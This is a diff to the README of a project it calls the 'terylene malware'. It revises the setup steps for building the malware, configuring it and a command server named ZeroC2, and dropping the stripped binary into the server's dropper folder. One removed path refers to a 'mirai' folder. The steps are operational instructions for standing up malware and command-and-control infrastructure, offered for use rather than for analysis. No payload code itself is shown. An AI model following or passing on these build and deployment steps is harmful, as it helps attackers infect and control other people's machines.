@@ -116,15 +116,11 @@ sudo go mod init terylene
 sudo go mod tidy
 ```
 
-### edit the configs in client.go and server.go respectively
+### edit the configs in config folder.
 
 ```
-cd mirai
-nano terylene.go
-cd ..
-cd server
-nano server.go
-cd ..
+cd config
+nano config.go
 ```
 
 ### build terylene and ZeroC2
@@ -140,7 +136,7 @@ sudo go build -ldflags="-s -w" terylene.go
 ### drop the terylene malware into the dropper
 
 ```
-mv terylene <path to the dropper folder>
+mv terylene ../server/dropper
 ```
 
 ### start the zeroC2
